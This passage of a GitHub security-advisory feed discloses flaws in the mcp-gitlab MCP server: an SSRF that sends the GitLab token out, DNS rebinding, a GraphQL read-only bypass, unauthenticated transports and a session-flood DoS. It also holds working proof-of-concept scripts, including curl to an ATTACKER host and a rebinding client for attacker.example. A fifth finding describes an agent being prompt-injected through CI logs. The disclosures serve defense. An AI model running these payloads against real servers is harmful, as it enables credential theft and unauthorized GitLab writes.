<p><strong>Unauthenticated full GitLab account takeover.</strong> Any attacker with network access to the MCP server port can steal the Personal Access Token and gain complete access to the GitLab instance as the token owner - including all repositories, CI/CD secrets and variables, deploy keys, project settings, and admin functions if the user has admin privileges. No credentials or user interaction are required. This is the default configuration for Docker deployments</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-cv3r-c5h8-f4g5">https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-cv3r-c5h8-f4g5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61560">https://nvd.nist.gov/vuln/detail/CVE-2026-61560</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/pull/482">https://github.com/zereight/gitlab-mcp/pull/482</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/pull/554">https://github.com/zereight/gitlab-mcp/pull/554</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/pull/622">https://github.com/zereight/gitlab-mcp/pull/622</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/commit/e436ee4ad067b64584ec9312c9e9c9a2641c1976">https://github.com/zereight/gitlab-mcp/commit/e436ee4ad067b64584ec9312c9e9c9a2641c1976</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27">https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27</a></li>
<li><a href="https://github.com/advisories/GHSA-cv3r-c5h8-f4g5">https://github.com/advisories/GHSA-cv3r-c5h8-f4g5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cv3r-c5h8-f4g5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-16T13:48:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@zereight/mcp-gitlab] @zereight/mcp-gitlab Vulnerable to Server-Side Request Forgery]]></title>
        <id>https://github.com/advisories/GHSA-2h44-8472-frjj</id>
        <link href="https://github.com/advisories/GHSA-2h44-8472-frjj"/>
        <updated>2026-09-15T20:57:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="server-side-request-forgery-via-x-gitlab-api-url-header-allows-credential-theft">Server-Side Request Forgery via X-GitLab-API-URL Header Allows Credential Theft</h1>
<h2 id="affected">Affected</h2>
<ul>
<li><strong>Repository:</strong> <code>zereight/gitlab-mcp</code></li>
<li><strong>Affected versions:</strong> All versions through commit <code>74a8c83</code></li>
<li><strong>Patched versions:</strong> None at time of report</li>
</ul>
<h2 id="severity">Severity</h2>
<p>High. CVSS v3.1 8.5 (<code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N</code>)</p>
<h2 id="description">Description</h2>
<p>When the environment variable <code>ENABLE_DYNAMIC_API_URL=true</code> is set, the server
reads the <code>X-GitLab-API-URL</code> HTTP request header and uses it as the base URL for
all outbound GitLab API calls made within that request. The server validates that
the value is a well-formed URL (<code>new URL(dynamicApiUrl)</code>) but applies no
allowlist or hostname restriction. The server then attaches the victim's
<code>Private-Token</code> to every outbound fetch that uses the redirected URL.</p>
<p>Any caller who can reach the HTTP transport can set <code>X-GitLab-API-URL</code> to an
attacker-controlled host. The next GitLab API call the server makes delivers the
victim's token to that host.</p>
<p>The vulnerable code appears at two locations.</p>
<p><strong>SSE handler (<code>index.ts:11541</code>):</strong></p>
<pre><code class="language-typescript">const dynamicApiUrl = req.headers["x-gitlab-api-url"]?.trim();
if (ENABLE_DYNAMIC_API_URL &amp;&amp; dynamicApiUrl) {
  apiUrl = normalizeGitLabApiUrl(dynamicApiUrl);   // no allowlist check
}
</code></pre>
<p><strong>Streamable HTTP handler (<code>index.ts:11787</code>), inside <code>parseAuthHeaders</code>:</strong></p>
<pre><code class="language-typescript">const dynamicApiUrl = req.headers["x-gitlab-api-url"]?.trim();
if (ENABLE_DYNAMIC_API_URL &amp;&amp; dynamicApiUrl) {
  new URL(dynamicApiUrl);                          // syntax-only check
  apiUrl = normalizeGitLabApiUrl(dynamicApiUrl);   // any reachable host accepted
}
</code></pre>
<p>In both cases, <code>apiUrl</code> propagates through <code>getEffectiveApiUrl()</code> and into
<code>getFetchConfig()</code>, which attaches <code>Private-Token: &lt;victim_token&gt;</code> to every
outbound fetch. The token reaches the attacker's host, not GitLab.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Run upstream <code>zereight/gitlab-mcp</code> at commit <code>74a8c83</code> with
<code>ENABLE_DYNAMIC_API_URL=true</code> and <code>REMOTE_AUTHORIZATION=true</code>.</p>
<pre><code class="language-bash"># 1. Start a listener on the attacker host (port 9099)
#    Any HTTP server that logs incoming headers will work.
python3 -c "
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print('HEADERS:', dict(self.headers))
        self.send_response(200); self.end_headers()
http.server.HTTPServer(('0.0.0.0', 9099), H).serve_forever()
"

# 2. Send any MCP tool call with the malicious header
curl -X POST http://TARGET:3002/mcp \
  -H "X-GitLab-API-URL: http://ATTACKER:9099/api/v4" \
  -H "Authorization: Bearer ANY_VALID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"list_issues","arguments":{"project_id":"1"}},"id":1}'
</code></pre>
<p>The listener receives:</p>
<pre><code>GET /api/v4/projects/1/issues HTTP/1.1
private-token: &lt;VICTIM_GITLAB_TOKEN&gt;
Host: ATTACKER:9099
</code></pre>
<p>The victim's token arrives at the attacker host. The attacker never needed it
in advance. The MCP server delivered it.</p>
<h2 id="impact">Impact</h2>
<p>The attacker obtains the victim's GitLab Personal Access Token or CI/CD job
token in a single request. With the stolen token they gain full GitLab API
access at the victim's permission level: read of all repositories, issues,
merge requests, CI/CD pipeline definitions and variables/secrets; write to push
code, modify pipelines, create or delete resources, and rotate CI/CD variables.</p>
<p>CVSS factors:</p>
<ul>
<li><code>PR:L</code>: reaching the HTTP transport requires presenting some auth token</li>
<li><code>S:C</code>: the attack crosses the boundary into GitLab (a separate security domain)</li>
<li><code>C:H</code>: victim's GitLab token stolen in one request; full read of all scoped data</li>
<li><code>I:H</code>: attacker can push code and modify pipelines with the stolen token</li>
<li><code>A:N</code>: the MCP server continues operating normally</li>
</ul>
<h2 id="why-this-is-a-vulnerability-not-intended-behavior">Why This Is a Vulnerability, Not Intended Behavior</h2>
<p><code>ENABLE_DYNAMIC_API_URL</code> is documented for supporting self-hosted GitLab
instances at a non-default base URL. The intended caller behavior is to supply
the URL of their own GitLab instance. The feature has no mechanism to distinguish
a legitimate self-hosted GitLab URL from an attacker-controlled host. Once
enabled, every request that includes <code>X-GitLab-API-URL</code> can redirect the server's
credential-carrying outbound calls to any reachable host with no restriction.</p>
<p>PR #453 (merged) added a startup guard that blocks the Streamable HTTP transport
from running with static tokens unless <code>REMOTE_AUTHORIZATION=true</code> or OAuth is
configured. That guard runs once at server startup and checks transport
configuration. It does not modify <code>parseAuthHeaders</code>, does not validate
<code>X-GitLab-API-URL</code>, and does not restrict the token-forwarding path at runtime.
The SSRF sink at <code>index.ts:11787</code> is unchanged in the current code and fully
reachable in the documented multi-user deployment mode (<code>REMOTE_AUTHORIZATION=true</code>).</p>
<h2 id="remediation">Remediation</h2>
<p>Validate <code>X-GitLab-API-URL</code> against a configurable allowlist of trusted GitLab
hostnames before assigning the value to <code>apiUrl</code>. Reject any request whose
<code>X-GitLab-API-URL</code> hostname is not in the allowlist. Apply this check at both
<code>index.ts:11541</code> and <code>index.ts:11787</code>.</p>
<p>Example fix for the Streamable HTTP handler:</p>
<pre><code class="language-typescript">const ALLOWED_HOSTS = (process.env.GITLAB_ALLOWED_HOSTS ?? "")
  .split(",").map(h =&gt; h.trim()).filter(Boolean);

const dynamicApiUrl = req.headers["x-gitlab-api-url"]?.trim();
if (ENABLE_DYNAMIC_API_URL &amp;&amp; dynamicApiUrl) {
  const parsed = new URL(dynamicApiUrl);
  if (!ALLOWED_HOSTS.includes(parsed.hostname)) {
    throw new Error(`X-GitLab-API-URL hostname not in allowlist: ${parsed.hostname}`);
  }
  apiUrl = normalizeGitLabApiUrl(dynamicApiUrl);
}
</code></pre>
<p>Document <code>GITLAB_ALLOWED_HOSTS</code> in the README alongside <code>ENABLE_DYNAMIC_API_URL</code>.
If maintaining an allowlist is not feasible, disable <code>ENABLE_DYNAMIC_API_URL</code> by
default and document the token-forwarding risk prominently.</p>
<h2 id="credit">Credit</h2>
<p>Reported via GitHub Security Advisory on 2026-06-07.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-2h44-8472-frjj">https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-2h44-8472-frjj</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/pull/625">https://github.com/zereight/gitlab-mcp/pull/625</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/commit/6ffb4cc70706fd05b1ab80901676bc2998b6db6d">https://github.com/zereight/gitlab-mcp/commit/6ffb4cc70706fd05b1ab80901676bc2998b6db6d</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27">https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27</a></li>
<li><a href="https://github.com/advisories/GHSA-2h44-8472-frjj">https://github.com/advisories/GHSA-2h44-8472-frjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2h44-8472-frjj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-15T20:57:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@zereight/mcp-gitlab] @zereight/mcp-gitlab: DNS rebinding reaches local Streamable HTTP MCP transport]]></title>
        <id>https://github.com/advisories/GHSA-vmp7-252j-cwp7</id>
        <link href="https://github.com/advisories/GHSA-vmp7-252j-cwp7"/>
        <updated>2026-09-15T20:54:56.000Z</updated>
        <content type="html"><![CDATA[<p><code>@zereight/mcp-gitlab</code> exposes its Streamable HTTP MCP endpoint without an effective Host or Origin allowlist. A malicious web page can use DNS rebinding to route browser requests to a victim's local MCP listener while preserving an attacker-controlled <code>Host</code> and <code>Origin</code>. The server accepts those headers and reaches the MCP initialization path instead of rejecting the request at the HTTP boundary.</p>
<p>This is CWE-350, Reliance on Reverse DNS Resolution for a Security-Critical Action. The affected package is <code>@zereight/mcp-gitlab</code> version <code>2.1.18</code> at commit <code>74a8c834424ff557ad8bc6f225e4dc5acf80aa13</code>.</p>
<p>The vulnerable transport setup is in <code>index.ts</code>. Express JSON parsing is installed globally before any MCP route-level Host or Origin allowlist:</p>
<pre><code class="language-typescript">// index.ts:12077
app.use(express.json());

registerDownloadProxy(app);
</code></pre>
<p>The Streamable HTTP transport is then created without the SDK DNS-rebinding controls:</p>
<pre><code class="language-typescript">// index.ts:12375
transport = new StreamableHTTPServerTransport({
  sessionIdGenerator: () =&gt; randomUUID(),
  onsessioninitialized: (newSessionId: string) =&gt; {
    streamableTransports[newSessionId] = transport;
    metrics.totalSessions++;
    metrics.activeSessions++;
  },
});
</code></pre>
<p>The transport constructor does not set <code>enableDnsRebindingProtection</code>, <code>allowedHosts</code>, or <code>allowedOrigins</code>. The server also does not add an Express middleware that rejects unexpected <code>Host</code> or <code>Origin</code> headers before <code>/mcp</code>.</p>
<p>The default host is loopback, which is the exact target DNS rebinding attacks are designed to reach:</p>
<pre><code class="language-typescript">// config.ts:192
export const HOST = getConfig("host", "HOST") || "127.0.0.1";

// config.ts:196
export const PORT = _intEnv("PORT", "port", _PORT_DEFAULT);
</code></pre>
<p>The README documents Streamable HTTP as a supported transport for modern remote deployments and documents <code>REMOTE_AUTHORIZATION=true</code> for multi-user HTTP deployments. In that mode, unauthenticated <code>tools/list</code> and material GitLab API tool calls are blocked by token checks. The Host/Origin defect is still present at the browser boundary: the server accepts attacker-controlled browser-origin headers and processes the MCP <code>initialize</code> request instead of rejecting the connection as cross-origin localhost access.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>The following reproduction uses a fake GitLab API with planted data. It proves the HTTP boundary failure and the token boundary separately:</p>
<ul>
<li>no-token <code>initialize</code> succeeds with attacker-controlled <code>Host</code> and <code>Origin</code>;</li>
<li>no-token <code>tools/list</code> is rejected with <code>401</code>;</li>
<li>the same forged-origin flow with a planted <code>Private-Token</code> lists tools and calls <code>list_project_variables</code>;</li>
<li>the fake GitLab API records the forwarded token and returns a planted fake project variable.</li>
</ul>
<p>Start the fake GitLab API:</p>
<pre><code class="language-bash">python3 - &lt;&lt;'PY'
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

WITNESS = "/tmp/zereight-gitlab-mcp-rebind-witness.jsonl"
PROJECT_ID = "pluto/rebind-target"
FAKE_SECRET = "glpat-FAKE-PROJECT-CI-SECRET-0001"

class Handler(BaseHTTPRequestHandler):
    def _json(self, status, payload):
        data = json.dumps(payload).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _record(self):
        parsed = urlparse(self.path)
        with open(WITNESS, "a", encoding="utf-8") as f:
            f.write(json.dumps({
                "method": self.command,
                "path": parsed.path,
                "query": parse_qs(parsed.query),
                "authorization": self.headers.get("authorization"),
                "private_token": self.headers.get("private-token"),
                "job_token": self.headers.get("job-token"),
            }, sort_keys=True) + "\n")

    def do_GET(self):
        self._record()
        path = urlparse(self.path).path
        if path == "/health":
            self._json(200, {"status": "ok"})
            return
        if path.startswith("/api/v4/") and not (
            self.headers.get("authorization") or
            self.headers.get("private-token") or
            self.headers.get("job-token")
        ):
            self._json(401, {"message": "401 Unauthorized", "missing": "GitLab token"})
            return
        if path.endswith("/variables"):
            self._json(200, [{
                "key": "PRODUCTION_DEPLOY_TOKEN",
                "value": FAKE_SECRET,
                "protected": True,
                "masked": False,
            }])
            return
        self._json(200, {"ok": True, "path": path})

    def log_message(self, fmt, *args):
        return

ThreadingHTTPServer(("127.0.0.1", 18082), Handler).serve_forever()
PY
</code></pre>
<p>In a second terminal, run the affected MCP server:</p>
<pre><code class="language-bash">git clone https://github.com/zereight/gitlab-mcp.git
cd gitlab-mcp
git checkout 74a8c834424ff557ad8bc6f225e4dc5acf80aa13
npm install
npm run build

STREAMABLE_HTTP=true \
REMOTE_AUTHORIZATION=true \
HOST=127.0.0.1 \
PORT=8082 \
GITLAB_API_URL=http://127.0.0.1:18082/api/v4 \
GITLAB_READ_ONLY_MODE=true \
GITLAB_TOOLSETS=issues,projects,repository,ci \
GITLAB_TOOLS=list_project_variables \
node build/index.js
</code></pre>
<p>In a third terminal, send MCP requests with attacker-controlled browser-origin headers:</p>
<pre><code class="language-bash">python3 - &lt;&lt;'PY'
import json
import urllib.error
import urllib.request

TARGET = "http://127.0.0.1:8082/mcp"
REBIND_HOST = "attacker.example:8082"
ORIGIN = "http://" + REBIND_HOST
TOKEN = "glpat-FAKE-ZEREIGHT-REBIND-TOKEN-0001"

def parse_rpc(text):
    stripped = text.strip()
    if stripped.startswith("{"):
        return [json.loads(stripped)]
    out = []
    for line in stripped.splitlines():
        line = line.strip()
        if line.startswith("data:"):
            out.append(json.loads(line[5:].strip()))
    return out

class Client:
    def __init__(self, token=None):
        self.sid = None
        self.token = token

    def post(self, body):
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream",
            "Host": REBIND_HOST,
            "Origin": ORIGIN,
        }
        if self.token:
            headers["Private-Token"] = self.token
        if self.sid:
            headers["Mcp-Session-Id"] = self.sid
            headers["MCP-Protocol-Version"] = "2025-06-18"
        req = urllib.request.Request(TARGET, data=json.dumps(body).encode(), headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=20) as res:
                sid = res.headers.get("Mcp-Session-Id") or res.headers.get("mcp-session-id")
                if sid:
                    self.sid = sid
                text = res.read().decode("utf-8", "replace")
                return res.status, parse_rpc(text), text
        except urllib.error.HTTPError as exc:
            text = exc.read().decode("utf-8", "replace")
            return exc.code, parse_rpc(text), text

    def rpc(self, method, params=None, rid=1):
        body = {"jsonrpc": "2.0", "id": rid, "method": method}
        if params is not None:
            body["params"] = params
        status, messages, raw = self.post(body)
        for msg in messages:
            if msg.get("id") == rid:
                return status, msg, raw
        return status, {}, raw

    def initialized(self):
        self.post({"jsonrpc": "2.0", "method": "notifications/initialized"})

def initialize(client, rid):
    return client.rpc("initialize", {
        "protocolVersion": "2025-06-18",
        "capabilities": {},
        "clientInfo": {"name": "dns-rebind-check", "version": "1"},
    }, rid)

unauth = Client()
status, init, raw = initialize(unauth, 1)
print("unauth initialize:", status, "session:", unauth.sid)
unauth.initialized()
status, listed, raw = unauth.rpc("tools/list", {}, 2)
print("unauth tools/list:", status, raw[:200])

authed = Client(TOKEN)
status, init, raw = initialize(authed, 3)
print("token initialize:", status, "session:", authed.sid)
authed.initialized()
status, listed, raw = authed.rpc("tools/list", {}, 4)
tools = [tool["name"] for tool in listed["result"]["tools"]]
print("listed list_project_variables:", "list_project_variables" in tools)
status, called, raw = authed.rpc("tools/call", {
    "name": "list_project_variables",
    "arguments": {"project_id": "pluto/rebind-target"},
}, 5)
print(raw)
PY
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">unauth initialize: 200 session: &lt;uuid&gt;
unauth tools/list: 401 {"error":"Missing Private-Token, JOB-TOKEN, or Authorization header","message":"Remote authorization is enabled. Please provide Private-Token, JOB-TOKEN, or Authorization header."}
token initialize: 200 session: &lt;uuid&gt;
listed list_project_variables: True
[
  {
    "key": "PRODUCTION_DEPLOY_TOKEN",
    "value": "glpat-FAKE-PROJECT-CI-SECRET-0001",
    "protected": true,
    "masked": false
  }
]
</code></pre>
<p>The fake GitLab API witness records that the MCP server forwarded the token to the backend request:</p>
<pre><code class="language-json">{"authorization": null, "job_token": null, "method": "GET", "path": "/api/v4/projects/pluto%2Frebind-target/variables", "private_token": "glpat-FAKE-ZEREIGHT-REBIND-TOKEN-0001", "query": {}}
</code></pre>
<h2 id="impact">Impact</h2>
<p>A malicious web page can reach a local <code>@zereight/mcp-gitlab</code> Streamable HTTP listener through DNS rebinding because the server accepts attacker-controlled <code>Host</code> and <code>Origin</code> headers. In the current remote-authorization mode, token checks block unauthenticated <code>tools/list</code> and material GitLab API calls. The remaining security failure is still real: the browser-origin boundary is not enforced, and any deployment mode or client flow that makes a GitLab token browser-suppliable or reuses an authenticated MCP session can expose GitLab tools to the attacker page.</p>
<p>The confirmed impact is:</p>
<ul>
<li>attacker-origin browser traffic reaches the local MCP <code>initialize</code> path;</li>
<li>server-side Host and Origin validation are absent on <code>/mcp</code>;</li>
<li>tool discovery and GitLab API tool execution work through the same forged-origin path when a token is present;</li>
<li>GitLab API calls execute with the supplied token and can return sensitive project data such as CI/CD variables.</li>
</ul>
<h2 id="why-this-is-a-vulnerability-not-intended-behavior">Why this is a vulnerability, not intended behavior</h2>
<ul>
<li>The server uses loopback binding as the local safety boundary. DNS rebinding bypasses that boundary from the victim browser unless the server enforces an allowlist for <code>Host</code> and <code>Origin</code>.</li>
<li>The MCP TypeScript SDK provides DNS-rebinding controls for Streamable HTTP. This server constructs <code>StreamableHTTPServerTransport</code> without enabling those controls and does not add an equivalent Express guard.</li>
<li><code>REMOTE_AUTHORIZATION=true</code> protects tool calls that lack a token, but it does not protect the HTTP transport from cross-origin browser access. Authentication and Host/Origin validation are separate controls.</li>
</ul>
<h2 id="remediation">Remediation</h2>
<p>Enable the SDK DNS-rebinding protection on the Streamable HTTP transport:</p>
<pre><code class="language-typescript">transport = new StreamableHTTPServerTransport({
  sessionIdGenerator: () =&gt; randomUUID(),
  enableDnsRebindingProtection: true,
  allowedHosts: [
    `127.0.0.1:${PORT}`,
    `localhost:${PORT}`,
  ],
  allowedOrigins: [
    `http://127.0.0.1:${PORT}`,
    `http://localhost:${PORT}`,
  ],
  onsessioninitialized: (newSessionId: string) =&gt; {
    streamableTransports[newSessionId] = transport;
  },
});
</code></pre>
<p>Add an Express middleware before <code>/mcp</code> that rejects unexpected <code>Host</code> and <code>Origin</code> values. Apply the same policy to SSE if that transport remains supported. Document the default-safe Host/Origin values and require explicit operator configuration for non-loopback deployments.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-vmp7-252j-cwp7">https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-vmp7-252j-cwp7</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/pull/555">https://github.com/zereight/gitlab-mcp/pull/555</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/commit/52207c6f5c0e7a39e9235d491225edbb562a0290">https://github.com/zereight/gitlab-mcp/commit/52207c6f5c0e7a39e9235d491225edbb562a0290</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.30">https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.30</a></li>
<li><a href="https://github.com/advisories/GHSA-vmp7-252j-cwp7">https://github.com/advisories/GHSA-vmp7-252j-cwp7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vmp7-252j-cwp7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-15T20:54:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@zereight/mcp-gitlab] @zereight/mcp-gitlab has multiple safety-control bypasses: execute_graphql read-only + allow-list bypass, unauthenticated transports, session-exhaustion DoS]]></title>
        <id>https://github.com/advisories/GHSA-5648-rgj9-v224</id>
        <link href="https://github.com/advisories/GHSA-5648-rgj9-v224"/>
        <updated>2026-09-15T20:48:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>@zereight/mcp-gitlab exposes GitLab to an LLM agent while relying on read-only mode, a project allow-list, and transport auth as its safety controls. Five defects defeat those controls. Under the MCP threat model, tool-call arguments/content can be shaped by untrusted input (prompt injection) or a malicious client.</p>
<p>Reviewed commit: 60adcc0de5b0e96c4c2029f7a25d2775946421d8 (package version 2.1.28). Source review only; PoCs are local/offline.</p>
<ul>
<li>F1 (HIGH) execute_graphql defeats BOTH read-only mode and GITLAB_ALLOWED_PROJECT_IDS.</li>
<li>F2 (HIGH, deployment-conditional) Streamable HTTP /mcp unauthenticated under cookie-jar / device-flow credentials.</li>
<li>F3 (MEDIUM) SSE unauthenticated by default, no Origin/Host validation (DNS rebinding).</li>
<li>F4 (HIGH) unauthenticated session/transport-exhaustion DoS (token check is syntactic only).</li>
<li>F5 (LOW) CI job trace returned verbatim (prompt-injection surface).</li>
</ul>
<h3 id="details">Details</h3>
<p>F1 — index.ts:9194-9245 (case "execute_graphql"), guard at :9196, detector in utils/graphql-query.ts.
(a) Read-only bypass: graphqlQueryContainsWriteOperation() strips comments/strings then tests /(?:^|[};]\s*)(mutation|subscription)\b/. GraphQL treats commas as insignificant, and stripGraphQLCommentsAndStrings does not remove them, so a document beginning with <code>,mutation{...}</code> executes as a write but is classified read-only. (b) Allow-list bypass: the handler never calls getEffectiveProjectId() or rejectIfProjectScopedDeployment() (unlike other tools), so a raw GraphQL body reaches /api/graphql with the server token against any project the token can access, regardless of GITLAB_ALLOWED_PROJECT_IDS. execute_graphql is listed in readOnlyTools (tools/registry.ts:1288).</p>
<p>F2 — index.ts:1048-1052 forces REMOTE_AUTHORIZATION/GITLAB_MCP_OAUTH only when started with a PAT or job token; hasCookie (:1029) and useOAuth (:1026) are absent from the gate. Started with --cookie-path or --use-oauth, validation passes and mcpBearerAuth degrades to next() (:12903). Every /mcp caller is unauthenticated while buildAuthHeaders() attaches the server's live session upstream.</p>
<p>F3 — index.ts:12276 requireSseAuth is a pass-through when SSE_AUTH_TOKEN is unset (default), and the SSE transport (:12290) is created with no enableDnsRebindingProtection/allowedHosts/allowedOrigins. On the default loopback bind, a malicious web page can DNS-rebind to drive the local server with the operator's GitLab credentials.</p>
<p>F4 — index.ts:12387 validateToken only checks length&gt;=20 and charset (no upstream verification); parseAuthHeaders returns AuthData for any such string; new sessions are admitted purely on capacity (:12938, MAX_SESSIONS default 1000), and the per-session rate limiter only runs when a sessionId already exists. So garbage-token initialize floods fill all session slots for SESSION_TIMEOUT_SECONDS (default 3600s) -&gt; 503 for legitimate users.</p>
<p>F5 — index.ts:10898-10911 (get_pipeline_job_output) returns the CI job trace to the model verbatim. Job logs are attacker-influenceable (e.g. a fork MR pipeline), so embedded instructions become model context and, combined with F1, can escalate to writes.</p>
<h3 id="poc-local-deterministic">PoC (local, deterministic)</h3>
<p>F1 detector (replicates the shipped logic, no network):
    isWrite("mutation{deleteProject(input:{id:1}){errors}}")   -&gt; DETECTED
    isWrite(",mutation{deleteProject(input:{id:1}){errors}}")  -&gt; BYPASS (executes as a write under read-only mode)</p>
<p>F2 (local GitLab + cookie file):
    STREAMABLE_HTTP=true GITLAB_AUTH_COOKIE_PATH=./cookies.txt GITLAB_API_URL=<a href="http://localhost:8080/api/v4">http://localhost:8080/api/v4</a> node build/index.js
    # starts without an auth error; from another shell with NO credentials:
    curl -s <a href="http://127.0.0.1:3002/mcp">http://127.0.0.1:3002/mcp</a> -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' <br>      -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"poc","version":"0"}}}'</p>
<p>F4 (REMOTE_AUTHORIZATION mode):
    for i in $(seq 1 1000); do curl -s -o /dev/null <a href="http://127.0.0.1:3002/mcp">http://127.0.0.1:3002/mcp</a> <br>      -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' <br>      -H 'Private-Token: aaaaaaaaaaaaaaaaaaaaaaaa' <br>      -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"x","version":"0"}}}'; done
    # subsequent legitimate initialize -&gt; 503 "Maximum 1000 concurrent sessions allowed"</p>
<h3 id="impact">Impact</h3>
<p>A semi-trusted client or a prompt-injected agent can perform arbitrary GitLab writes while the operator believes the server is read-only, against projects outside the allow-list, up to the token's privileges (F1). Anyone able to reach the port (directly or via DNS rebinding on loopback) can use the server's GitLab credentials with no authentication (F2/F3). An unauthenticated attacker can deny service with ~1000 trivial requests (F4). Attacker-influenced CI logs can steer the agent (F5).</p>
<h3 id="remediation">Remediation</h3>
<p>Parse execute_graphql with a real GraphQL parser and reject non-query operations; enforce project scope or disable the tool under an allow-list (F1). Extend the startup gate to (hasToken || hasJobToken || hasCookie || useOAuth) and ship a mandatory Streamable-HTTP auth token (F2). Enable SDK DNS-rebinding protection with allowedHosts/allowedOrigins and require SSE_AUTH_TOKEN by default (F3). Validate tokens upstream before allocating a session, rate-limit new-session creation per IP, lower idle timeout (F4). Frame externally-sourced content as untrusted and cap size (F5).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-5648-rgj9-v224">https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-5648-rgj9-v224</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/issues/596">https://github.com/zereight/gitlab-mcp/issues/596</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/issues/748">https://github.com/zereight/gitlab-mcp/issues/748</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/pull/571">https://github.com/zereight/gitlab-mcp/pull/571</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/pull/624">https://github.com/zereight/gitlab-mcp/pull/624</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/commit/69e784da33e96e64867b511c6f14d3f21f91ba8b">https://github.com/zereight/gitlab-mcp/commit/69e784da33e96e64867b511c6f14d3f21f91ba8b</a></li>
<li><a href="https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.30">https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.30</a></li>
<li><a href="https://github.com/advisories/GHSA-5648-rgj9-v224">https://github.com/advisories/GHSA-5648-rgj9-v224</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5648-rgj9-v224</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-15T20:48:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Duplicate Advisory: Flowise OverrideConfig security vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5w6g-rc45-wvv9</id>
        <link href="https://github.com/advisories/GHSA-5w6g-rc45-wvv9"/>
        <updated>2026-09-14T17:15:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-5cph-wvm9-45gj. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>Flowise before 2.1.4 allows configuration to be injected into the Chainflow during execution via the overrideConfig option, supported in both the frontend web integration and the backend Prediction API. Because this feature is enabled by default with no allow-list of permitted variables and relies on vm2 for sandboxing, an attacker can abuse it to achieve remote code execution and sandbox escape, denial of service by crashing the server, server-side request forgery, prompt injection, and server variable and data exfiltration. These issues are self-targeted and do not persist to other users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5cph-wvm9-45gj">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5cph-wvm9-45gj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-58351">https://nvd.nist.gov/vuln/detail/CVE-2024-58351</a></li>
